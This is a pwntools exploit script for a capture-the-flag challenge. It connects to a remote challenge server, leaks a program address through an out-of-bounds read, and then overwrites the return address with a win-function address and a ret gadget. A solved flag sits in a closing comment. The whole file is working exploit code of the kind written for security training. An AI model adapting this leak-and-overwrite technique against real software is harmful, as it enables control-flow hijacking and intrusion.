from pwn import *
context.binary = "./chall"
#p = process()
p = remote("eth007.me",42055)
def view_element(idx: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    leak = int(p.recvline().strip(b'\n'),base=16)
    return leak
def set_element(idx: int, add: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'value:', str(add).encode())

def exit():
    p.sendlineafter(b'> ', b'3')

main_leak = view_element(21)
log.info("Main leak: %s", hex(main_leak))
win_leak = int(hex(main_leak)[:-3]+'1e9',base=16)
ret = int(hex(main_leak)[:-3]+'3d1',base=16)
log.info("Win leak: %s", hex(win_leak))
set_element(19,ret)
set_element(20,win_leak)
#gdb.attach(p,'b*main+456')
exit()
p.interactive()

#Flag = ictf{all_protections_no_problem_22b63d92}